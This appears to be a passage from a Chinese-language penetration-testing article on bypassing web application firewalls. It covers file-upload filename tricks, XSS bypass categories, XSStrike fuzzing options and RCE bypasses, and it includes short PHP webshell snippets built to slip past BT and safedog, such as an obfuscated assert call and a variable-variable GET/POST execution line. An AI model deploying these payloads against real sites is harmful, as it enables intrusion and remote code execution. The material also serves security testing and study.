利用 WAF 读取换行时为\n ，而数据包却能完整的去读出来换行 如下：WAF 读取到的为 filename 为 x.\np\nh\np 从而 WAF 无法获取到 php 的执行文件达到 绕过效果

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQw1cdiaOpOsA2RiaJKvX9ryud9odxSU9kstibHcicQcbhib29oklTQ4QVSzw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**⑤重复数据** 

**一 借助原有数据绕过** 

利用 content-Disposition:* from-data; name=”upload_file”; 的值带入 filename 中, 从而使得 WAF 在检测时直接检测到 filename 为 content-Disposition:* from-data; name=”upload_file”; 从 而作为白名单而绕过了 WAF 而服务器接收到的确实 x.php 

**二利用白名单绕过** 重复构造 filename=”*.jpg” 最后在以 filename=”*.php”结尾从而利用递归的问题, 绕过了 WAF,类似前面的文件上传后端部分的双写绕过



**三、XSS-WAF 绕过**

***\*手工\** \**XSS\** \**绕过\**\**:\****

**1. 标签语法替代** 

**2. 特殊符号干扰** 

**3. 提交方式更改** 

**4. 垃圾数据溢出** 

**5. 加密解密算法** 

**6. 结合其它漏洞绕过**

***\*
\****

***\*XSStrike\** \**工具绕过\**** 

***\*使用延时或者代理池绕过\** \**CC\** \**即可\** --timeout 或者--proxy** 

***\*模糊测试\**\**--fuzzer,\**\**该模糊器旨在测试过滤器和\** \**Web\** \**应用程序防火墙，可使用\**\**-d\** \**选项将延迟设\** \**置为\** \**1\** \**秒。\****

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQMXxdiaJJzdUCJpEATCicK3q1CrqKaAe9ffFHpqhWeKOE8upQ36qlH0FA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**
**

***\*四、RCE-WAF 绕过\**** 

***\*①加密解密绕过\**** 

**可逆 base64，url 编码 不可逆 md5 \**注意：\**不能在可变变量中传入 base64_decode() 函数因为，会被 BT 拦截，所以一般该方 式行不通就会换成下面的方式。** 

***\*②关键字绕过\**** 

***\*如\** \**phpinfo();\**** 

***\*可以替换成如下写法：\** $y=str_replace('x','','pxhpxinxfo()');assert($y);**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ5ibuv1N4JeRibLfEaqXUFoNgwbcxpmLFtAEZXu7jLaMUHkc2J9Ujm7gA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



***\*③提交方法\**** 

**利用变量覆盖加上请求方法达到该效果，如本来是 POST 方法，修改后变成 GET 方法从而达 到绕过 WAF \**$a=$_GET['x'];$$a=$_GET['y'];$b($_POST['z']);\** 下面的尝试未开启 BT，只有 safedog 的测试**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQKMT63Qn3pTJRmictibibiamnfrdXJQDftXuiczwJA5L17w5GThtCsGPXcGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**过滤了 assert 关键字时,利用下面方法达到绕过 原理:就是拼接字符串**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQMGicduZUYobyPB3K7sSGNPu6kPhHPbicficf9eUUtm5L0wXROqwMM8FIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)